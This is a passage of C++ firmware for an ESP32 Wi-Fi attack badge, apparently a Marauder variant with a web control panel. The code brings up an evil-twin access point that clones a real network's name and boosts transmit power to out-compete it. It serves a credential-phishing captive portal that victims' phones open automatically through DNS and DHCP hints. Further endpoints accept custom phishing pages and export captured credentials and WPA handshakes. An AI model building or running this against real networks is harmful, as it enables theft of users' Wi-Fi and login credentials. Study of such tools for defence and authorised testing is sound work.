      SPIFFS.rename("/portal.html.gz", "/portal_mgmt.html.gz");
      Serial.println("[MGMT] Management portal (gzip) moved aside for evil twin");
    } else if (SPIFFS.exists("/portal.html.gz")) {
      // A backup already exists from an earlier attack; this copy is stale.
      SPIFFS.remove("/portal.html.gz");
    }

    // Write evil portal HTML as /portal.html so the captive handler serves it
    File f = SPIFFS.open("/portal.html", "w");
    f.print(html);
    f.close();

    // Configure evil portal: set AP name
    strncpy(apName, ssid_et.c_str(), MAX_AP_NAME_SIZE - 1);
    apName[MAX_AP_NAME_SIZE - 1] = '\0';
    // Skip index_html (too small on C5), serve from SPIFFS instead
    this->has_ap = true;
    this->has_html = true;

    Serial.println("[MGMT] Starting Evil Twin: " + ssid_et + " ch" + String(ch) +
                   (ch_req != ch ? (" (requested ch" + String(ch_req) +
                                    ", clamped to 2.4GHz)") : String("")) +
                   " tpl=" + tpl + " dur=" + String(dur) + "s");

    // Tear down management
    server.stop();
    WiFi.softAPdisconnect(true);
    delay(300);

    // Bring the evil AP up exactly the way rearmManagementAP() does, which is
    // the only AP sequence proven to work on this board. Four details were
    // missing here and each one is load-bearing:
    //   1. WIFI_AP_STA, not WIFI_AP. Dropping the STA interface breaks a later
    //      scanNetworks(), which is why the management path deliberately keeps
    //      it ("Bug2: preserve STA interface").
    //   2. The softAP() result was discarded. Combined with DebugLevel=none,
    //      which compiles out the core's own log_e(), a failed AP left no trace
    //      anywhere: the firmware announced "READY" for a network that never
    //      existed, and the 200 OK had already been sent to the panel.
    //   3. TX power was never set, so the evil AP silently inherited the 8.5dBm
    //      that the management AP lowers it to - far too weak to out-compete
    //      the real network it is cloning.
    //   4. No DHCP server. softAP() does not reliably start it on this core, so
    //      a victim could associate and then sit without an IP, never reaching
    //      the portal. The management path starts it explicitly for this reason.
    WiFi.mode(WIFI_AP_STA);
    delay(200);
    // Record the preconditions BEFORE the attempt. When softAP() returns false
    // the Arduino core has already discarded the real esp_err_t and its log_e()
    // is compiled out by DebugLevel=none, so these values are the only evidence
    // of what it was actually asked to do.
    uint32_t heap_before = ESP.getFreeHeap();
    int mode_before = (int)WiFi.getMode();
    bool ap_ok = WiFi.softAP(apName, "", ch);
    if (ap_ok) WiFi.setTxPower(WIFI_POWER_20dBm);

    if (!ap_ok) {
      // Management was already torn down above, so failing silently here takes
      // the badge off the air completely - and with duration 0 nothing would
      // ever rearm it, which is exactly how this looked from the outside: no
      // evil network and no panel either. Hand the badge back to the REARM
      // branch of mgmtServiceJob() rather than restoring inline; that path is
      // already tested and its setupManagementServer() also puts both portal
      // files back.
      evilNote("Evil Twin FAILED: softAP(\"" + String(apName) + "\" len=" +
               String(strlen(apName)) + ") ch=" + String(ch) +
               " refused. mode_before=" + String(mode_before) +
               " mode_after=" + String((int)WiFi.getMode()) +
               " heap=" + String(heap_before) + " -> restoring management AP");
      this->has_ap    = false;
      this->has_html  = false;
      this->runServer = false;
      this->dnsServer.stop();
      this->mgmt_job_state = MGMT_JOB_REARM;
      return;
    }

    // DHCP server: mirror the management path. Without this an associated
    // victim gets no IP and never loads the portal.
    //
    // A lease on its own is not enough for a phone to OPEN the portal by
    // itself. iOS and Android judge a network by fetching a known URL
    // (captive.apple.com, connectivitycheck.gstatic.com) and they can only
    // reach ours if the lease tells them to use the badge as their name
    // server. ESP-IDF's DHCP server does NOT advertise one unless OFFER_DNS
    // is set explicitly, and nothing here ever set it - so every probe went to
    // whatever resolver the phone already had and never arrived at the badge.
    // That is exactly why opening 192.168.4.1 by hand showed the portal while
    // the sheet never appeared on its own: a manual visit needs no lookup.
    esp_netif_t *et_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (et_netif) {
      bool cp_ok = false;
#if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 4, 2)
      // RFC 8910 (DHCP option 114). iOS 14+ and Android 11+ open the portal
      // straight from this hint without waiting for a probe to fail, so it is
      // a second and faster path to the same result. Done first because it
      // stops and restarts DHCP internally, which would otherwise undo the
      // option set below. Best effort: older clients ignore it and fall back
      // to the name-server path.
      cp_ok = WiFi.AP.enableDhcpCaptivePortal();
#endif
      esp_netif_dhcps_stop(et_netif);

      // Advertise the badge itself as the name server.
      esp_netif_dns_info_t et_dns;
      memset(&et_dns, 0, sizeof(et_dns));
      et_dns.ip.type = ESP_IPADDR_TYPE_V4;
      et_dns.ip.u_addr.ip4.addr = static_cast<uint32_t>(WiFi.softAPIP());
      esp_err_t dns_err = esp_netif_set_dns_info(et_netif, ESP_NETIF_DNS_MAIN, &et_dns);

      // lwip's dhcps_offer_t bit meaning "include a DNS server in the lease"
      // (OFFER_DNS in dhcpserver.h). Written as a local constant to avoid
      // pulling an lwip application header into this translation unit.
      const uint8_t OFFER_DNS_BIT = 0x02;
      uint8_t et_offer = OFFER_DNS_BIT;
      esp_err_t off_err = esp_netif_dhcps_option(
          et_netif, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
          &et_offer, sizeof(et_offer));

      esp_err_t dh_err = esp_netif_dhcps_start(et_netif);

      esp_netif_dhcp_status_t et_st = ESP_NETIF_DHCP_INIT;
      esp_netif_dhcps_get_status(et_netif, &et_st);
      evilNote("Evil Twin DHCP: dhcps=" +
               String(et_st == ESP_NETIF_DHCP_STARTED ? "on" : "OFF") +
               " dns_offer=" + String(off_err == ESP_OK ? "ok" : "ERR") +
               " dns_set=" + String(dns_err == ESP_OK ? "ok" : "ERR") +
               " start=" + String((int)dh_err) +
               " rfc8910=" + String(cp_ok ? "ok" : "no") +
               " ip=" + WiFi.softAPIP().toString());
    } else {
      evilNote("Evil Twin WARNING: AP netif handle not found, no DHCP/DNS offer");
    }

    // Read the beacon configuration back from the driver instead of trusting the
    // values we asked for. softAP() can succeed while the radio ends up on a
    // different channel or authmode than requested (region rules, band
    // switching), and that difference is invisible from the HTTP response - it
    // is exactly what made "READY but no network anywhere" impossible to
    // diagnose. authmode is the raw esp_wifi value: 0=OPEN, 1=WEP, 3=WPA2_PSK.
    wifi_config_t et_actual;
    if (esp_wifi_get_config(WIFI_IF_AP, &et_actual) == ESP_OK) {
      evilNote("Evil Twin UP: beacon ssid=\"" + String((const char *)et_actual.ap.ssid) +
               "\" ch=" + String((int)et_actual.ap.channel) +
               " authmode=" + String((int)et_actual.ap.authmode) +
               " hidden=" + String((int)et_actual.ap.ssid_hidden) +
               " ip=" + WiFi.softAPIP().toString() +
               (((int)et_actual.ap.channel != ch)
                  ? (" WARNING: asked ch" + String(ch))
                  : String("")));
    } else {
      evilNote("Evil Twin UP but AP config could not be read back");
    }

    Serial.println("[MGMT] Evil Twin AP: " + String(apName) + " IP: " + WiFi.softAPIP().toString());

    // DNS wildcard for captive portal
    this->dnsServer.start(53, "*", WiFi.softAPIP());

    // Setup server with captive portal routes (setupServer includes /get handler)
    this->setupServer();
    server.begin();
    this->runServer = true;

    // G: Bug G — track duration so mgmtServiceJob can auto-rearm management AP
    this->mgmt_job_state      = MGMT_JOB_ATTACK;
    this->mgmt_job_kind       = "eviltwin";
    this->mgmt_job_t0         = millis();
    this->mgmt_job_duration_s = (dur > 0) ? (uint32_t)dur : 0;
    Serial.println("[MGMT] Evil Twin READY - will rearm management AP after " +
                   (dur > 0 ? String(dur) + "s" : "RESET"));
  });

  // ── API: POST /api/evil_upload — upload custom evil portal HTML ──
  server.on("/api/evil_upload", HTTP_POST, [this]() {
    String html = mgmtBodyStr("html");
    if (html.length() < 10) {
      server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"HTML too short\"}");
      return;
    }
    if (html.length() > 51200) {
      server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"output\":\"HTML too large (max 50KB)\"}");
      return;
    }
    File f = SPIFFS.open("/evil_custom.html", "w");
    f.print(html);
    f.close();
    server.send(200, "application/json; charset=utf-8",
      "{\"ok\":true,\"size\":" + String(html.length()) + "}");
  });

  // ── API: GET /api/evil_templates — list available templates ──
  server.on("/api/evil_templates", HTTP_GET, [this]() {
    bool hasCustom = SPIFFS.exists("/evil_custom.html");
    int customSize = 0;
    if (hasCustom) {
      File f = SPIFFS.open("/evil_custom.html", "r");
      customSize = f.size();
      f.close();
    }
    server.send(200, "application/json; charset=utf-8",
      "{\"templates\":[\"generic\",\"wifi\",\"corp\""
      + String(hasCustom ? ",\"custom\"" : "") +
      "],\"custom_size\":" + String(customSize) + "}");
  });

  // ── API: POST /api/ota — firmware OTA update via file upload ──
  // F: Bug F — require ?confirm=CONFIRM_OTA; track ota_started/ota_ok; only restart on real success.
  // Accepts multipart form with field 'firmware' containing .bin
  static bool ota_started = false;
  static bool ota_ok      = false;
  server.on("/api/ota", HTTP_POST,
    // Response handler (called after upload completes)
    [this]() {
      // F: reject if no confirm query param
      if (!server.hasArg("confirm") || server.arg("confirm") != "CONFIRM_OTA") {
        server.send(403, "application/json; charset=utf-8",
          "{\"ok\":false,\"code\":\"confirm_required\",\"output\":\"require ?confirm=CONFIRM_OTA\"}");
        ota_started = false; ota_ok = false;
        return;
      }
      if (!ota_started) {
        server.send(400, "application/json; charset=utf-8",
          "{\"ok\":false,\"code\":\"no_upload\",\"output\":\"No file was uploaded\"}");
        return;
      }
      if (!ota_ok || Update.hasError()) {
        server.send(500, "application/json; charset=utf-8",
          "{\"ok\":false,\"output\":\"Update failed: " +
          String(Update.errorString()) + "\"}");
        ota_started = false; ota_ok = false;
        return;
      }
      server.send(200, "application/json; charset=utf-8",
        "{\"ok\":true,\"output\":\"Update OK. Rebooting...\"}");
      delay(500);
      ESP.restart();
    },
    // Upload handler (called for each chunk)
    [this]() {
      // F: also gate upload on confirm
      if (!server.hasArg("confirm") || server.arg("confirm") != "CONFIRM_OTA") {
        return; // response handler will reject
      }
      HTTPUpload& upload = server.upload();
      if (upload.status == UPLOAD_FILE_START) {
        ota_started = true; ota_ok = false;
        Serial.println("[OTA] Starting: " + upload.filename);
        int cmd = upload.filename.indexOf("spiffs") >= 0 ? U_SPIFFS : U_FLASH;
        size_t maxSize = cmd == U_SPIFFS ? 0xE0000 : 0x300000;
        if (!Update.begin(maxSize, cmd)) {
          Serial.println("[OTA] Begin failed: " + String(Update.errorString()));
        }
      } else if (upload.status == UPLOAD_FILE_WRITE) {
        if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
          Serial.println("[OTA] Write failed: " + String(Update.errorString()));
        }
      } else if (upload.status == UPLOAD_FILE_END) {
        if (Update.end(true)) {
          ota_ok = true;
          Serial.println("[OTA] Success: " + String(upload.totalSize) + " bytes");
        } else {
          ota_ok = false;
          Serial.println("[OTA] End failed: " + String(Update.errorString()));
        }
      }
    }
  );

  // ── API: GET /api/spiffs — SPIFFS info ──────────────────────
  server.on("/api/spiffs", HTTP_GET, [this]() {
    size_t total = SPIFFS.totalBytes();
    size_t used = SPIFFS.usedBytes();
    String json = "{\"total\":" + String(total) + ",\"used\":" + String(used) +
                  ",\"free\":" + String(total - used) + ",\"files\":[";
    File root = SPIFFS.open("/");
    // I: Bug I — close each child file and root to avoid FD leak
    bool first = true;
    if (root && root.isDirectory()) {
      File f = root.openNextFile();
      while (f) {
        if (!first) json += ",";
        json += "{\"name\":\"" + String(f.name()) + "\",\"size\":" + String(f.size()) + "}";
        first = false;
        f.close();  // I: close child FD
        f = root.openNextFile();
      }
      root.close(); // I: close root FD
    }
    json += "]}";
    server.send(200, "application/json; charset=utf-8", json);
  });

  // ── API: GET /api/export/scan — export APs as CSV (chunked) ──
  server.on("/api/export/scan", HTTP_GET, [this]() {
    server.sendHeader("Content-Disposition", "attachment; filename=scan_results.csv");
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200, "text/csv", "");
    server.sendContent("BSSID,SSID,Channel,RSSI,Selected\n");
    char line[128];
    for (int i = 0; i < access_points->size(); i++) {
      AccessPoint ap = access_points->get(i);
      snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X,%s,%d,%d,%s\n",
               ap.bssid[0], ap.bssid[1], ap.bssid[2],
               ap.bssid[3], ap.bssid[4], ap.bssid[5],
               ap.essid.c_str(), ap.channel, ap.rssi,
               ap.selected ? "yes" : "no");
      server.sendContent(line);
    }
    server.sendContent("");
  });

  // ── API: GET /api/export/captures — export evil twin captures ─
  server.on("/api/export/captures", HTTP_GET, [this]() {
    if (!SPIFFS.exists("/captures.json")) {
      server.sendHeader("Content-Disposition", "attachment; filename=captures.txt");
      server.send(200, "text/plain", "No captures\n");
      return;
    }
    File f = SPIFFS.open("/captures.json", "r");
    String data = f.readString();
    f.close();
    server.sendHeader("Content-Disposition", "attachment; filename=captures.json");
    server.send(200, "application/json; charset=utf-8", data);
  });

  // ── API: GET /api/export/handshake — export handshake results (chunked) ─
  server.on("/api/export/handshake", HTTP_GET, [this]() {
    server.sendHeader("Content-Disposition", "attachment; filename=handshakes.csv");
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200, "text/csv", "");
    server.sendContent("BSSID,SSID,Channel,RSSI,Type,PMKID,Messages\n");
    char line[128];
    for (int i = 0; i < hs_count; i++) {
      uint8_t m = hs_list[i].eapol_msgs;
      const char* t = "none";
      if (m == 0x0F) t = "full";
      else if ((m & 0x03) == 0x03) t = "half";
      else if (hs_list[i].has_pmkid) t = "pmkid";
      else if (m > 0) t = "partial";
      snprintf(line, sizeof(line),
               "%02X:%02X:%02X:%02X:%02X:%02X,%s,%d,%d,%s,%s,0x%02X\n",
               hs_list[i].bssid[0], hs_list[i].bssid[1], hs_list[i].bssid[2],
               hs_list[i].bssid[3], hs_list[i].bssid[4], hs_list[i].bssid[5],
               hs_list[i].ssid, hs_list[i].ch, hs_list[i].rssi,
               t, hs_list[i].has_pmkid ? "yes" : "no", m);
      server.sendContent(line);
    }
    server.sendContent("");
  });

  // ── API: POST /api/monitor — start/stop passive monitors ──────
  // {type:'deauth'|'probe'|'signal'|'all', action:'start'|'stop', bssid (for signal)}
  server.on("/api/monitor", HTTP_POST, [this]() {
    String type = mgmtBodyStr("type");
    String action = mgmtBodyStr("action");
    if (action == "start") {
      if (type == "deauth" || type == "all") {
        deauth_count = 0; deauth_monitor_active = true;
        memset(deauth_list, 0, sizeof(deauth_list));
      }
      if (type == "probe" || type == "all") {
        probe_count = 0; probe_monitor_active = true;
        memset(probe_list, 0, sizeof(probe_list));
      }
      if (type == "signal") {
        String bssid_str = mgmtBodyStr("bssid");
        if (bssid_str.length() == 17) {
          unsigned int b[6];
          sscanf(bssid_str.c_str(), "%x:%x:%x:%x:%x:%x",
                 &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
          for (int i=0;i<6;i++) sig_track_bssid[i]=b[i];
          sig_track_active = true;
          sig_track_rssi = -100;
        }
      }
      // Enable promiscuous if not already (AP_STA keeps AP alive)
      if (!hs_active) {
        WiFi.mode(WIFI_AP_STA);
        delay(50);
        wifi_promiscuous_filter_t filt;
        filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous_rx_cb(&EvilPortal::monitorSnifferCallback);
        esp_wifi_set_promiscuous(true);
      }
      server.send(200, "application/json; charset=utf-8", "{\"ok\":true}");
    } else if (action == "stop") {
      deauth_monitor_active = false;
      probe_monitor_active = false;
      sig_track_active = false;
      if (!hs_active) {
        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_AP);
        delay(50);
      }
      server.send(200, "application/json; charset=utf-8", "{\"ok\":true}");
    } else {
      server.send(400, "application/json; charset=utf-8", "{\"ok\":false}");
    }
  });

  // ── API: GET /api/monitor/deauth — deauth events ─────────────
  server.on("/api/monitor/deauth", HTTP_GET, [this]() {
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200, "application/json; charset=utf-8", "");
    server.sendContent("{\"active\":" + String(deauth_monitor_active?"true":"false") +
                       ",\"count\":" + String(deauth_count) + ",\"events\":[");
    char buf[128];
    for (int i = 0; i < deauth_count; i++) {
      snprintf(buf, sizeof(buf),
               "%s{\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"n\":%u,\"rssi\":%d,\"ago\":%lu}",
               i?",":"",
               deauth_list[i].bssid[0],deauth_list[i].bssid[1],deauth_list[i].bssid[2],
               deauth_list[i].bssid[3],deauth_list[i].bssid[4],deauth_list[i].bssid[5],
               deauth_list[i].count, deauth_list[i].rssi,
               (millis()-deauth_list[i].last_ms)/1000);
      server.sendContent(buf);
    }
    server.sendContent("]}");
    server.sendContent("");
  });

  // ── API: GET /api/monitor/probe — probe requests ─────────────
  server.on("/api/monitor/probe", HTTP_GET, [this]() {
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200, "application/json; charset=utf-8", "");
    server.sendContent("{\"active\":" + String(probe_monitor_active?"true":"false") +
                       ",\"count\":" + String(probe_count) + ",\"probes\":[");
    char buf[160];
    for (int i = 0; i < probe_count; i++) {
      snprintf(buf, sizeof(buf),
               "%s{\"mac\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"ssid\":\"%s\",\"rssi\":%d,\"ago\":%lu}",
               i?",":"",
               probe_list[i].mac[0],probe_list[i].mac[1],probe_list[i].mac[2],
               probe_list[i].mac[3],probe_list[i].mac[4],probe_list[i].mac[5],
               probe_list[i].ssid, probe_list[i].rssi,
               (millis()-probe_list[i].last_ms)/1000);
      server.sendContent(buf);
    }
    server.sendContent("]}");
    server.sendContent("");
  });

  // ── API: GET /api/monitor/signal — signal strength tracker ───
  server.on("/api/monitor/signal", HTTP_GET, [this]() {
    char buf[128];
    snprintf(buf, sizeof(buf),
             "{\"active\":%s,\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"rssi\":%d,\"ago\":%lu}",
             sig_track_active?"true":"false",
             sig_track_bssid[0],sig_track_bssid[1],sig_track_bssid[2],
             sig_track_bssid[3],sig_track_bssid[4],sig_track_bssid[5],
             sig_track_rssi,
             sig_track_active ? (millis()-sig_track_last_ms)/1000 : 0);
    server.send(200, "application/json; charset=utf-8", buf);
  });

  // No captive redirect, no /get route: unknown paths get a plain 404
  server.onNotFound([this]() {
    server.send(404, "text/plain", "not found");
  });

  Serial.println("[MGMT] Management routes registered");

  // Collect Accept-Encoding header so mgmtServeFile can serve gzip
  const char* hdrs[] = {"Accept-Encoding"};
  server.collectHeaders(hdrs, 1);
}

// Restore the management AP exactly as startManagementPortal() boots it.
// Called at boot and after every web-triggered scan/attack job ends, so
// the phone can reconnect and fetch the results. Reusable re-arm helper.
bool EvilPortal::rearmManagementAP() {
  // Disable promiscuous if handshake capture was active
  if (hs_active) {
    esp_wifi_set_promiscuous(false);
    hs_active = false;
#ifndef MARAUDER_FLIPPER_C5
    Serial.println("[MGMT] Promiscuous mode disabled");
#endif
  }
  // WiFiScan::RunSetup() runs initWiFi() before startManagementPortal() has
  // built the SSID. softAP("") fails and leaves the AP netif half-started,
  // so skip the radio entirely until the identity exists.
  if (this->mgmt_ssid.length() == 0)
    return false;
  WiFi.mode(WIFI_AP_STA); // Bug2: preserve STA interface for scanNetworks()

  // Returning from an evil twin means the AP interface was last configured as an
  // OPEN network on a channel we did not choose. Rebuilding a WPA2 AP directly
  // on top of that left the beacon half-converted: clients saw the privacy bit
  // set with no usable RSN element, reported the network as WEP, and then
  // refused to associate - the management AP looked present but unjoinable.
  // Clearing the interface first makes the transition deterministic. The boot
  // path deliberately does NOT take this branch, because the plain sequence
  // below is the one proven to work on this board and must not change.
  if (this->mgmt_job_kind == "eviltwin") {
    Serial.println("[MGMT] clean AP reset before rearm (returning from evil twin)");
    WiFi.softAPdisconnect(true);
    delay(300);
    WiFi.mode(WIFI_AP_STA);
    delay(200);
  }

  // auth_mode and cipher are passed explicitly instead of relying on the core's
  // defaults, so the management AP's advertised security can never depend on
  // what a previous attack left behind in the driver.
  bool ok = WiFi.softAP(this->mgmt_ssid.c_str(), MGMT_AP_PASS, 1, 0, 4, false,
                        WIFI_AUTH_WPA2_PSK, WIFI_CIPHER_TYPE_CCMP); // WPA2 ch1
  #ifdef MARAUDER_FLIPPER_C5
    WiFi.setTxPower(WIFI_POWER_8_5dBm);
  #endif
  if (!ok) {
    Serial.println("[MGMT] ERROR: management SoftAP (re)start failed");
    return false;
  }
  // Clients that associate but never get a lease self-assign 169.254.x.x.
  // Make sure the AP DHCP server is actually running after every (re)arm.
  esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
  if (ap_netif) {
    esp_netif_dhcp_status_t st = ESP_NETIF_DHCP_INIT;
    esp_netif_dhcps_get_status(ap_netif, &st);
    if (st != ESP_NETIF_DHCP_STARTED) {
      esp_err_t err = esp_netif_dhcps_start(ap_netif);
      Serial.printf("[MGMT] DHCP server was %d, start -> %d\n", (int)st, (int)err);
    }
    esp_netif_dhcps_get_status(ap_netif, &st);
    Serial.printf("[MGMT] AP up ip=%s dhcps=%s\n",
                  WiFi.softAPIP().toString().c_str(),
                  st == ESP_NETIF_DHCP_STARTED ? "on" : "OFF");
  } else {
    Serial.println("[MGMT] WARNING: AP netif handle not found");
  }
  // Confirm what the radio is actually advertising. If the management AP ever
  // comes back unjoinable again, this line says why in one glance instead of
  // requiring another flash to find out: authmode 3 is WPA2_PSK (correct),
  // 1 is WEP and 0 is OPEN, either of which breaks a saved WPA2 profile on
  // every client that had joined before.
  wifi_config_t mgmt_actual;
  if (esp_wifi_get_config(WIFI_IF_AP, &mgmt_actual) == ESP_OK) {
    Serial.printf("[MGMT] AP beacon: ssid=\"%s\" ch=%d authmode=%d%s\n",
                  (const char *)mgmt_actual.ap.ssid, (int)mgmt_actual.ap.channel,
                  (int)mgmt_actual.ap.authmode,
                  mgmt_actual.ap.authmode == WIFI_AUTH_WPA2_PSK ? "" : "  <-- WRONG, expected 3");
  }
  return true;
}

String EvilPortal::mgmtJobStateName() {
  switch (this->mgmt_job_state) {
    case MGMT_JOB_SCANNING: return "scanning";
    case MGMT_JOB_ATTACK:   return "attack";
    case MGMT_JOB_REARM:    return "rearm";
    default:                return "idle";
  }
}

String EvilPortal::mgmtStateJson() {
  bool busy = (this->mgmt_job_state != MGMT_JOB_IDLE);
  uint32_t elapsed = busy ? (millis() - this->mgmt_job_t0) / 1000UL : 0;
  String remaining = "null"; // null = indefinite or not applicable
  if (busy && this->mgmt_job_duration_s > 0) {
    long rem = (long)this->mgmt_job_duration_s - (long)elapsed;
    remaining = String(rem > 0 ? (uint32_t)rem : 0);
  }
  // H: Bug H — derive job kind/type for contract /api/state job{} field
  String job_kind = "idle";
  String job_type = "";
  if (this->mgmt_job_state == MGMT_JOB_SCANNING || this->mgmt_job_state == MGMT_JOB_ATTACK) {
    // Parse kind string like "scan-ap-direct", "attack-deauth", "sniff-deauth", "blespam-apple", etc.
    String k = this->mgmt_job_kind;
    if (k.startsWith("scan"))       { job_kind = "scan";     job_type = k.substring(k.indexOf('-')+1); }
    else if (k.startsWith("sniff")) { job_kind = "sniffer";  job_type = k.substring(k.indexOf('-')+1); }
    else if (k.startsWith("ble"))   { job_kind = "ble";      job_type = k.substring(k.indexOf('-')+1); }
    else if (k.startsWith("blespam")){ job_kind = "ble";     job_type = k.substring(k.indexOf('-')+1); }
    else if (k == "eviltwin")        { job_kind = "eviltwin"; job_type = ""; }
    else if (k.startsWith("wardrive")){ job_kind = "wardrive"; job_type = k.length() > 9 ? k.substring(9) : ""; }
    else if (k.startsWith("handshake")){ job_kind = "handshake"; job_type = "passive"; }
    else if (k.startsWith("attack")) { job_kind = "attack";   job_type = k.substring(k.indexOf('-')+1); }
    else { job_kind = k; }
  } else if (this->mgmt_job_state == MGMT_JOB_REARM) {
    job_kind = "rearm";
  }
  // H: ble_ready flag
  bool ble_ready = false;
#ifdef HAS_BT
  ble_ready = NimBLEDevice::isInitialized();
#endif

  String json = "{";
  json += "\"fw\":\"" + mgmtJsonEscape(version_number) + "\"";
  json += ",\"board\":\"" + mgmtJsonEscape(board_target) + "\"";
  json += ",\"ap_ssid\":\"" + mgmtJsonEscape(this->mgmt_ssid) + "\"";
  json += ",\"ip\":\"" + WiFi.softAPIP().toString() + "\"";
  json += ",\"uptime_s\":" + String(millis() / 1000UL);
  json += ",\"heap\":" + String(ESP.getFreeHeap());
  json += ",\"heap_min\":" + String(esp_get_minimum_free_heap_size());   // H
  json += ",\"ble_ready\":" + String(ble_ready ? "true" : "false");      // H
  json += ",\"ap_stations\":" + String(WiFi.softAPgetStationNum());       // BUG-04 fix: client count
  json += ",\"mgmt_state\":\"" + this->mgmtJobStateName() + "\"";
  // Outcome of the last evil twin attempt, read from SPIFFS. The panel shows
  // this verbatim so a failed attack explains itself without a serial cable,
  // which is the only way the operator can ever see it: the management AP is
  // down for the whole attack and the RAM log is gone by the time it returns.
  json += ",\"evil_last\":\"" + mgmtJsonEscape(evilNoteRead()) + "\"";
  // Probe hits since start. Zero while an evil twin is up means no victim
  // device ever reached us; a rising number means they did and the portal
  // decision is theirs, not ours.
  json += ",\"cp_probes\":" + String((uint32_t)_cpProbes);
  // H: job object per contract
  json += ",\"job\":{\"kind\":\"" + mgmtJsonEscape(job_kind) + "\"";
  json += ",\"type\":\"" + mgmtJsonEscape(job_type) + "\"";
  json += ",\"elapsed\":" + String(elapsed);
  json += ",\"remaining\":" + remaining + "}";
  // Legacy detail field for backward compat
  json += ",\"detail\":{\"kind\":\"" + mgmtJsonEscape(this->mgmt_job_kind) + "\"";
  json += ",\"elapsed_s\":" + String(elapsed);
  json += ",\"remaining_s\":" + remaining + "}}";
  return json;
}

// Advance the management job state machine. Serviced every loop() pass
// from mainManagement(). Scan/attack jobs end on their firmware-side
// timer; REARM restores the management AP, then the state returns to
// IDLE and the phone reconnects to fetch results.
void EvilPortal::mgmtServiceJob() {
  uint32_t now = millis();
  if (this->mgmt_job_state == MGMT_JOB_SCANNING) {
    // C: Bug C — poll async WiFi scan completion
    if (this->mgmt_job_kind == "scan-ap-direct") {
      int16_t n = WiFi.scanComplete();
      if (n == WIFI_SCAN_RUNNING) {
        // still scanning; hard safety cap = time budget + 15s slack
        if (now - this->mgmt_job_t0 > this->mgmt_job_duration_s * 1000UL + 15000UL) {
          Serial.println("[MGMT] scan timeout; cancelling");
          WiFi.scanDelete();
          this->mgmt_job_state = MGMT_JOB_IDLE;
          this->mgmt_job_kind  = "";
          this->mgmt_job_duration_s = 0;
        }
        return; // not done yet
      }
      // scan done or failed
      if (n > 0) {
        int added = 0;
        for (int i = 0; i < n; i++) {
          uint8_t *bss = WiFi.BSSID(i);
          // Cross-cycle dedup against the flat table (no struct copies)
          bool dupe = false;
          if (bss) {
            for (uint8_t s = 0; s < this->mgmt_scan_seen_n; s++) {
              if (memcmp(this->mgmt_scan_seen[s], bss, 6) == 0) { dupe = true; break; }
            }
          }
          if (dupe) continue;
          if (access_points->size() >= 64) break; // hard cap

          AccessPoint ap;
          ap.essid   = WiFi.SSID(i);
          if (ap.essid.length() == 0) ap.essid = WiFi.BSSIDstr(i);
          ap.channel = (uint8_t)WiFi.channel(i);
          ap.rssi    = (int8_t)WiFi.RSSI(i);  // BUG-02 fix: was (char) → unsigned on RISC-V
          ap.selected = false;
          ap.beacon   = nullptr;
          ap.stations = new LinkedList<uint8_t>();
          ap.wpsPresent = false; ap.wpsState = 0; ap.wpsLocked = false;
          ap.wpsVulnerable = false;
          // H: Bug H — store encryption type for /api/aps auth field
          ap.encryptionType = (uint8_t)WiFi.encryptionType(i);
          if (bss) memcpy(ap.bssid, bss, 6);
          else     memset(ap.bssid, 0, 6);
          access_points->add(ap);
          added++;
          if (bss && this->mgmt_scan_seen_n < 64) {
            memcpy(this->mgmt_scan_seen[this->mgmt_scan_seen_n], bss, 6);
            this->mgmt_scan_seen_n++;
          }
        }
        Serial.printf("[MGMT] cycle: %d found, +%d new, %d total\n",
                      (int)n, added, access_points->size());
      } else {
        Serial.println("[MGMT] scan done: 0 or error (" + String(n) + ")");
        // First scan after softAP is active often returns 0 / WIFI_SCAN_FAILED
        // because the radio is busy serving the AP. Retry exactly once.
        // Guarded by mgmt_scan_retried, and still bounded by the timeout
        // above since mgmt_job_t0 is NOT reset here.
        if (!this->mgmt_scan_retried) {
          this->mgmt_scan_retried = true;
          Serial.println("[MGMT] empty scan; auto-retrying once");
          WiFi.scanDelete();
          WiFi.scanNetworks(true /*async*/, true /*show_hidden*/);
          return; // stay in SCANNING; next poll picks up the retry
        }
      }
      WiFi.scanDelete(); // free the driver buffers before deciding anything

      // Another cycle only if ALL THREE hold. Any one failing ends the scan,
      // so this can neither run forever nor starve the heap:
      //  1. the remaining time budget fits a whole cycle (~5s)
      //  2. the AP table is below the hard cap
      //  3. a healthy contiguous block is still available for the driver
      uint32_t elapsedMs = now - this->mgmt_job_t0;
      uint32_t budgetMs  = this->mgmt_job_duration_s * 1000UL;
      size_t   largest   = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
      if (budgetMs > elapsedMs + 5000UL &&
          access_points->size() < 64 &&
          largest > 40000) {
        WiFi.scanNetworks(true /*async*/, true /*show_hidden*/);
        return; // stay in SCANNING for the next cycle
      }
      if (largest <= 40000)
        Serial.printf("[MGMT] stopping cycles: largest block %u\n", (unsigned)largest);

      Serial.printf("[MGMT] scan finished: %d APs in %lus\n",
                    access_points->size(), (unsigned long)(elapsedMs / 1000UL));
      this->mgmt_job_state = MGMT_JOB_IDLE;
      this->mgmt_job_kind  = "";
      this->mgmt_job_duration_s = 0;
      return;
    }
    // other SCANNING jobs (wardrive/sniffer) expire on timer
    if (this->mgmt_job_duration_s > 0 &&
        now - this->mgmt_job_t0 >= this->mgmt_job_duration_s * 1000UL) {
      Serial.println("[MGMT] job timer expired (" + this->mgmt_job_kind +
                     "); stopscan + rearm");
